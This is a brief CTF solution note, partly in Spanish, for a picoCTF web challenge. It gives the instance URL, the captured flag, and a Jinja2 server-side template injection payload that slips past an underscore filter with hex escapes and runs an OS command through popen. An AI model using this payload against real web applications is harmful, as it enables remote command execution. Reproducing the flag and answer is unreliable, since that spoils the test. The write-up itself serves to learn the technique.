
Descripcion:
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)

Additional details will be available after launching your challenge instance.
Solucion(s):
http://shape-facility.picoctf.net:64401/
picoCTF{sst1_f1lt3r_byp4ss_4de30aa0}
Notas:
se introduce el siguiente comando:
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}  

Referencias:
https://www.youtube.com/watch?v=bPD6cg3Gvng